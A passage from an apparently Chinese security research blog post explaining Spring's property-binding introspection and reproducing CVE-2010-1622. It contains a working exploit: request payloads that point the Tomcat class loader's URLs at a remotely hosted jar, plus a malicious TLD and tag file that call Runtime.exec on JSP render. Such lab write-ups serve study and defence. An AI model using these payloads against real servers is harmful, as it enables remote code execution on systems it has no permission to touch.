class="hljs-number">36</span>, User (com<span class="hljs-selector-class">.lingx5</span><span class="hljs-selector-class">.spring4shell</span>.entry)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">77</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">568</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>setValue:<span class="hljs-number">332</span>, BeanWrapperImpl<span class="hljs-variable">$BeanPropertyHandler</span> (org<span class="hljs-selector-class">.springframework</span>.beans)<br>processLocalProperty:<span class="hljs-number">463</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">278</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">266</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValues:<span class="hljs-number">104</span>, AbstractPropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>applyPropertyValues:<span class="hljs-number">856</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">751</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">198</span>, WebDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br>bind:<span class="hljs-number">118</span>, ServletRequestDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br></code></pre></td></tr></table></figure><blockquote><p>值得注意的是：</p><p>如果变量为数组类型，即使没有提供对应的 setter 方法，也是可以修改值得，假设有一个 <code>private String[] name;</code> 这样一个变量，我们此时访问 <code>/user?name[0]=lingx5</code> 会把 name [0] 的值修改为 lingx5 ，这其实就是得益于 java 的内省机制，我们后边会讲到。</p><p>在 org.springframework.beans.BeanWrapperImpl#setPropertyValue 方法中 调用了 Array.set() 方法，给数组赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510151700832.png" alt="image-20250510151700832"></p></blockquote><h3 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h3><p>在 Java 运行时会有两种对象：Class 对象和实例对象。</p><p>Class 对象就是有 JVM 抽象的对象信息：比如有一个类 <code>User</code> 编译后对应一个 <code>User.class</code> 文件，这个 class 只会被 JVM 加载一次，JVM 会把它的描述信息抽象成一个对象（java.lang.Class）。正是这个类提供了 java 的反射机制，来操作源类</p><p>实例对象：User u &#x3D; new User(); 这个 <code>u</code> 就是一个实例对象，可以正常的进行对象方法的调用等操作</p><p>同样的可以简单写一个测试，比较一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// User实例对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        System.out.println(u);<br>        <span class="hljs-comment">// Class对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz1</span> <span class="hljs-operator">=</span> User.class;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz2</span> <span class="hljs-operator">=</span> u.getClass();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.lingx5.spring4shell.entry.User&quot;</span>);<br>        <span class="hljs-comment">// 输出结果相同，因为Class对象是由JVM在加载类时创建的，所以同一个类只会有一个Class对象</span><br>        System.out.println(clazz1);<br>        System.out.println(clazz2);<br>        System.out.println(clazz3);<br>        <span class="hljs-comment">// 同时，Class对象也是一个类，所以也有自己的Class对象</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span>&gt; clazz4 = clazz1.getClass();<br>        System.out.println(clazz4);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507204516562.png" alt="image-20250507204516562"></p><h3 id="javaBean"><a href="#javaBean" class="headerlink" title="javaBean"></a>javaBean</h3><p>其实 javaBean 格式的相关内容，我们再 <a href="https://www.cnblogs.com/LINGX5/p/18788161#javabean-%E5%AF%B9%E8%B1%A1">fastjson</a> 中已经讲到过了，这里主要就是了解一下在 javaBean 中的内省机制(<code>Introspector</code>) </p><p>Introspector（内省）是 Java 语言中的一种通过反射机制分析类的属性、方法和事件的技术。其实就是允许 javaBean 分析自己的 getter 和 setter 方法查看自己的属性</p><p>jdk 中的内省类主要有</p><ol><li><strong>Introspector 类</strong> : 用 <code>getBeanInfo()</code> 方法获取 JavaBean 的描述信息，封装了分析一个 bean 的全部逻辑</li><li><strong>BeanInfo 接口</strong> : <code>getPropertyDescriptors()</code> 获得所有属性的描述符数组。</li><li><strong>PropertyDescriptor 类</strong> : 封装了一个 Bean 属性的名字、类型、getter、setter 方法等 , 可以调用对应方法，获得 bean 的相关属性和方法</li></ol><p>我们看一个具体的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">import</span> java.beans.BeanInfo;<br><span class="hljs-keyword">import</span> java.beans.Introspector;<br><span class="hljs-keyword">import</span> java.beans.PropertyDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntrospectorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 利用Introspector获取User类的BeanInfo信息</span><br>        <span class="hljs-type">BeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> Introspector.getBeanInfo(User.class);<br>        <span class="hljs-comment">// 获取所有的属性描述符，并遍历输出属性名、getter和setter方法</span><br>        <span class="hljs-keyword">for</span> (PropertyDescriptor pd : beanInfo.getPropertyDescriptors()) &#123;<br>            System.out.println(pd.getName()+<span class="hljs-string">&quot;属性的getter和setter方法：&quot;</span>);<br>            System.out.println(pd.getReadMethod());<br>            System.out.println(pd.getWriteMethod());<br>            System.out.println(<span class="hljs-string">&quot;--------------------------------------&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出的结果</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">age属性的getter和setter方法：<br>public int com.lingx5.spring4shell.entry.User.getAge()<br>public void com.lingx5.spring4shell.entry.User.setAge(int)<br>--------------------------------------<br>class属性的getter和setter方法：<br>public final native java.lang.Class java.lang.Object.getClass()<br>null<br>--------------------------------------<br>name属性的getter和setter方法：<br>public java.lang.String com.lingx5.spring4shell.entry.User.getName()<br>public void com.lingx5.spring4shell.entry.User.setName(java.lang.String)<br>--------------------------------------<br>test属性的getter和setter方法：<br>public com.lingx5.spring4shell.entry.User$Test com.lingx5.spring4shell.entry.User.getTest()<br>public void com.lingx5.spring4shell.entry.User.setTest(com.lingx5.spring4shell.entry.User$Test)<br>--------------------------------------<br></code></pre></td></tr></table></figure><p>可以看到 <code>User</code> 这个 javaBean 的属性和对应的 getter、setter 方法</p><blockquote><p>这里有一个 class 属性，并且有读方法，这是由于所有类都是 Object 的子类，Object 又拥有 getClass()方法，Java 内省机制认为，只要有 get&#x2F;set 方法中的其中一个，那么就可以找到 class 属性</p><p>class 属性的 getter 和 setter 方法：<br>public final native java.lang.Class java.lang.Object.getClass()<br>null</p></blockquote><h3 id="SpringBean"><a href="#SpringBean" class="headerlink" title="SpringBean"></a>SpringBean</h3><p>springbean 是 spring 框架运行时所管理的对象，可以说只要被 Spring 容器管理，任何类型的 Java 对象都可以是 Spring Bean，但是 springbean 不像 javaBean 一样有严格的限制，满足一下即可</p><ul><li>尽量为每个 Bean 实现类提供无参的构造器</li><li>接受构造注入的 Bean，应该提供对应的构造方法</li><li>接受值注入的 Bean，应该提供对应的 setter 方法，并不强制要求提供对应的 getter 方法</li></ul><p>当然 SpringBean 也有对应的内省机制（<code>BeanWrapperImpl</code>），实际上在 <strong>SpringMVC 参数绑定</strong> 也是依靠内省机制实现的</p><p><strong>BeanWrapperImpl 内省</strong></p><p>BeanWrapperImpl 他相当于是 <code>java.beans.Introspector 内省</code> 的增强，底层使用了 Introspector 机制，但还额外支持了 Spring 类型转换机制、嵌套属性、复杂路径表达式（比如 person.address.city），并且能更好地处理集合&#x2F;数组等特殊类型。</p><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.BeanWrapperImpl;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanWrapperTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">BeanWrapperImpl</span> <span class="hljs-variable">beanWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanWrapperImpl</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>());<br>        <span class="hljs-keyword">for</span> (PropertyDescriptor pd : beanWrapper.getPropertyDescriptors()) &#123;<br>            System.out.println(pd.getName()+<span class="hljs-string">&quot;属性的getter和setter方法：&quot;</span>);<br>            System.out.println(pd.getReadMethod());<br>            System.out.println(pd.getWriteMethod());<br>            System.out.println(<span class="hljs-string">&quot;------------------------------&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//调用写方法，修改属性值</span><br>        beanWrapper.setPropertyValue(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        beanWrapper.setPropertyValue(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">20</span>);<br>        System.out.println(beanWrapper.getPropertyValue(<span class="hljs-string">&quot;name&quot;</span>)+<span class="hljs-string">&quot; : &quot;</span>+beanWrapper.getPropertyValue(<br>                <span class="hljs-string">&quot;age&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">age属性的getter和setter方法：<br>public int com.lingx5.spring4shell.entry.User.getAge()<br>public void com.lingx5.spring4shell.entry.User.setAge(int)<br>------------------------------<br>class属性的getter和setter方法：<br>public final native java.lang.Class java.lang.Object.getClass()<br>null<br>------------------------------<br>name属性的getter和setter方法：<br>public java.lang.String com.lingx5.spring4shell.entry.User.getName()<br>public void com.lingx5.spring4shell.entry.User.setName(java.lang.String)<br>------------------------------<br>test属性的getter和setter方法：<br>public com.lingx5.spring4shell.entry.User$Test com.lingx5.spring4shell.entry.User.getTest()<br>public void com.lingx5.spring4shell.entry.User.setTest(com.lingx5.spring4shell.entry.User$Test)<br>------------------------------<br>调用了setName方法<br>调用了setAge方法<br>调用了getName方法<br>调用了getAge方法<br>lingx5 : 20<br></code></pre></td></tr></table></figure><blockquote><p>BeanWrapperImpl 可以直接调用封装好的 setPropertyValue 和 getPropertyValue 来方便的对 springbean 的属性进行操作</p></blockquote><p>而对于 person.address.city 这样多级嵌套的支持，主要是在 org.springframework.beans.BeanWrapperImpl#getBeanWrapperForPropertyPath 实现的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510152758258.png" alt="image-20250510152758258"></p><h2 id="CVE-2010-1622"><a href="#CVE-2010-1622" class="headerlink" title="CVE-2010-1622"></a>CVE-2010-1622</h2><p>我们先来看之前爆出的这个漏洞，这个最早披露的该类型的漏洞，因为在 SpringBean 里有 class 属性可以利用内省覆盖对应对的 ClassLoader，可以修改 Tomcat WebappClassLoader 中的 repositoryURLs 让应用程序加载自定义 jar，从而实现命令执行</p><p>影响早期版本的 spring 框架</p><ul><li><p>Spring Framework</p><ul><li>&gt;&#x3D; 2.5.0, &lt;&#x3D; 2.5.6</li><li>&gt;&#x3D; 3.0.0, &lt;&#x3D; 3.0.2</li></ul></li><li><p>Tomcat</p><ul><li>&lt; 6.0.28</li></ul></li></ul><p>环境搭建：用的师傅的 github 项目，<code>https://github.com/l3yx/vuln-debug/spring-framework/CVE-2010-1622</code></p><p>这个公开的 payload 为</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/user?class.classLoader.URLs</span>[<span class="hljs-string">0</span>]=jar:http://127.0.0.1:8081/springExp.jar!/<br></code></pre></td></tr></table></figure><h3 id="jstl"><a href="#jstl" class="headerlink" title="jstl"></a><strong>jstl</strong></h3><p>全称是 JavaServer Pages Standard Tag Library，即 Java 服务器页面标准标签库。他是一组自定义的标签库，当然也可以自定义。这就是我们攻击成功的主要原因，Spring 在渲染 jsp 页面时，会去加载标签库，因为我们在 jar 包中自定义了恶意的标签，在加载解析时触发命令执行</p><h3 id="攻击大致流程"><a href="#攻击大致流程" class="headerlink" title="攻击大致流程"></a><strong>攻击大致流程</strong></h3><ol><li>用 class.classLoader 获得 ClassLoader 类加载器，而在 tomcat 中类加器一般为 org.apache.catalina.loader.WebappClassLoader 它继承了 URLClassLoader 有一个 getURLs() 方法返回 URLs 的数组</li><li>springbean 的内省机制，对于数组不需要 setter 方法也可以修改值，内部是 Array.set() 实现的</li><li>tomcat 的 org.apache.jasper.compiler.TldLocationsCache 会从 WebappClassLoader 里面读取 urls 参数并解析恶意的 TLD 文件，实现 RCE</li></ol><h3 id="springExp-jar"><a href="#springExp-jar" class="headerlink" title="springExp.jar"></a>springExp.jar</h3><p>TldLocationsCache 的主要就是扫描 JAR 包、&#x2F;WEB-INF&#x2F;、&#x2F;META-INF&#x2F; 路径，找到可用的 TLD 文件。</p><blockquote><p>Tomcat 会自动扫描 &#x2F;WEB-INF&#x2F;lib 中所有 JAR 的 &#x2F;META-INF&#x2F;.tld 文件以及 Web 应用程序的 &#x2F;META-INF&#x2F;.tld 文件，以查找自定义标签库描述符。</p></blockquote><p>主要代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 初始化</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> JasperException &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.initialized) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 处理 web.xml 配置文件</span><br>            <span class="hljs-built_in">this</span>.processWebDotXml();<br>            <span class="hljs-comment">// 扫描应用依赖的 JAR 包,寻找里面的 TLD文件</span><br>            <span class="hljs-built_in">this</span>.scanJars();<br>            <span class="hljs-comment">// 扫描和处理 /WEB-INF/ 目录下的 TLD 文件</span><br>            <span class="hljs-built_in">this</span>.processTldsInFileSystem(<span class="hljs-string">&quot;/WEB-INF/&quot;</span>);<br>            <span class="hljs-built_in">this</span>.initialized = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperException</span>(Localizer.getMessage(<span class="hljs-string">&quot;jsp.error.internal.tldinit&quot;</span>, ex.getMessage()));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 调用了 scanJars()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scanJars</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 从线程获取webappClassLoader</span><br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">webappLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> webappLoader; loader != <span class="hljs-literal">null</span>; loader = loader.getParent()) &#123;<br>        <span class="hljs-keyword">if</span> (loader <span class="hljs-keyword">instanceof</span> URLClassLoader) &#123;<br>            <span class="hljs-comment">// 拿到URL[]数组</span><br>            URL[] urls = ((URLClassLoader)loader).getURLs();<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; urls.length; ++i) &#123;<br>                <span class="hljs-type">URLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> urls[i].openConnection();<br>                <span class="hljs-keyword">if</span> (conn <span class="hljs-keyword">instanceof</span> JarURLConnection) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.needScanJar(loader, webappLoader, ((JarURLConnection)conn).getJarFile().getName())) &#123;<br>                        <span class="hljs-comment">// 调用scanJar 加载 tld 文件</span><br>                        <span class="hljs-built_in">this</span>.scanJar((JarURLConnection)conn, <span class="hljs-literal">true</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">urlStr</span> <span class="hljs-operator">=</span> urls[i].toString();<br>                    <span class="hljs-keyword">if</span> (urlStr.startsWith(<span class="hljs-string">&quot;file:&quot;</span>) &amp;&amp; urlStr.endsWith(<span class="hljs-string">&quot;.jar&quot;</span>) &amp;&amp; <span class="hljs-built_in">this</span>.needScanJar(loader, webappLoader, urlStr)) &#123;<br>                        <span class="hljs-type">URL</span> <span class="hljs-variable">jarURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:&quot;</span> + urlStr + <span class="hljs-string">&quot;!/&quot;</span>);<br>                        <span class="hljs-built_in">this</span>.scanJar((JarURLConnection)jarURL.openConnection(), <span class="hljs-literal">true</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们的 springExp.jar 中肯定就是在 META-INF 目录下自定义 TLD 文件</p><p>目录结构</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510123543530.png" alt="image-20250510123543530" style="zoom:50%;" /><p><strong>springform.tld</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;taglib xmlns=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span><br>    xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xsi:schemaLocation=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&quot;</span> version=<span class="hljs-string">&quot;2.0&quot;</span>&gt;<br>    &lt;description&gt;Spring Framework JSP Form Tag Library&lt;/description&gt;<br>    &lt;tlib-version&gt;<span class="hljs-number">3.0</span>&lt;/tlib-version&gt;<br>    &lt;<span class="hljs-type">short</span>-name&gt;form&lt;/<span class="hljs-type">short</span>-name&gt;<br>    &lt;uri&gt;http:<span class="hljs-comment">//www.springframework.org/tags/form&lt;/uri&gt;</span><br>    &lt;tag-file&gt;<br>        &lt;name&gt;input&lt;/name&gt;<br>        &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;<br>    &lt;/tag-file&gt;<br>    &lt;tag-file&gt;<br>        &lt;name&gt;form&lt;/name&gt;<br>        &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;<br>    &lt;/tag-file&gt;<br>&lt;/taglib&gt;<br></code></pre></td></tr></table></figure><p><strong>InputTag.tag</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ tag dynamic-attributes=<span class="hljs-string">&quot;dynattrs&quot;</span> %&gt;<br>&lt;%<br>    java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>可以看到我们自定义的 springform.tld 文件，覆盖了 springMVC 自己的 input 和 form 标签，改为了 <code>/META-INF/tags/InputTag.tag</code> 恶意的标签，当 jsp 渲染的时候会执行恶心代码</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>我们发送开启 http 服务，发送 payload</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/demo/test?class.classLoader.URLs</span>[<span class="hljs-string">0</span>]=jar:http://lingx5.dns.army:8000/springExp.jar!/<br></code></pre></td></tr></table></figure><p>看到在 org.apache.jasper.compiler.TldLocationsCache#scanJars 中获得的 URLs [] 数组的第 0 个元素被我们改成了恶意的 jar 包地址</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510105828563.png" alt="image-20250510105828563"></p><p>成功弹出计算器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510123651699.png" alt="image-20250510123651699"></p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><p><strong>赋值 urls []</strong> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510130517681.png" alt="image-20250510130517681"></p><p>调用栈</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">setPropertyValue:</span><span class="hljs-number">1146</span>, <span class="hljs-keyword">BeanWrapperImpl </span>(<span class="hljs-keyword">org.springframework.beans)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">setPropertyValue:</span><span class="hljs-number">857</span>, <span class="hljs-keyword">BeanWrapperImpl </span>(<span class="hljs-keyword">org.springframework.beans)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">setPropertyValues:</span><span class="hljs-number">76</span>, AbstractPropertyAccessor (<span class="hljs-keyword">org.springframework.beans)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">applyPropertyValues:</span><span class="hljs-number">665</span>, DataBinder (<span class="hljs-keyword">org.springframework.validation)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">doBind:</span><span class="hljs-number">561</span>, DataBinder (<span class="hljs-keyword">org.springframework.validation)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">doBind:</span><span class="hljs-number">190</span>, WebDataBinder (<span class="hljs-keyword">org.springframework.web.bind)</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bind:110, </span>ServletRequestDataBinder (<span class="hljs-keyword">org.springframework.web.bind)</span><br></code></pre></td></tr></table></figure><p><strong>解析 URLs []</strong></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510130756902.png" alt="image-20250510130756902"></p><p>调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">scanJars:<span class="hljs-number">504</span>, TldLocationsCache (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>init:<span class="hljs-number">244</span>, TldLocationsCache (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>getLocation:<span class="hljs-number">219</span>, TldLocationsCache (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>getTldLocation:<span class="hljs-number">530</span>, JspCompilationContext (org<span class="hljs-selector-class">.apache</span>.jasper)<br>parseTaglibDirective:<span class="hljs-number">419</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parseDirective:<span class="hljs-number">476</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parseElements:<span class="hljs-number">1426</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parse:<span class="hljs-number">133</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>doParse:<span class="hljs-number">215</span>, ParserController (org<span class="hljs-selector-class">.apache</span><span 